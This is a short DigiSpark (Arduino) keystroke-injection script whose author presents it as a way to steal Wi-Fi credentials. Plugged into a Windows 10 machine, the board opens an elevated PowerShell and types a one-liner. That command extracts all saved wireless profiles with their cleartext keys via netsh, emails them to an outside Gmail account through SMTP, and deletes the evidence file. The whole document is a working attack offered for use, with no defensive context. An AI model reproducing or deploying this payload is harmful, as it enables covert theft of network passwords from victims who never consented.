//This DigiSpark script writes the wireless network credential and emails it.
//Made by me :) ------  BRAINIFII
//The older script stopped working on newer builds of Windows 10
//Windows 10 now require an elevated cmd or powershell to execute these commands.

#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("$a=0;ForEach($b in ((netsh wlan show profile|findstr \"All User Profile\") -match \"All User Profile\").split(\":\")){if($a -eq \"1\") {(netsh wlan show profile $b.substring(1) Key=clear|findstr /I \"SSID Content\"|findstr /V \"SSIDs\") -replace \"[^`\"]$\",\"`r`n\">>a;$a++}else{$a=1}};$c=New-Object Net.Mail.SmtpClient(\"smtp.gmail.com\",587);$c.EnableSsl=$true;$c.Credentials=New-Object System.Net.NetworkCredential(\"YOUR_EMAIL@gmail.com\",\"YOUR_PASSWORD\");$d=New-Object System.Net.Mail.MailMessage;$d.From=\"YOUR_EMAIL@gmail.com\";$d.To.Add(\"YOUR_EMAIL@gmail.com\");$d.Subject=($env:UserName+\"@\"+$env:UserDomain);$d.Body=(Get-Content a|out-string);$c.Send($d);Remove-Item a;exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
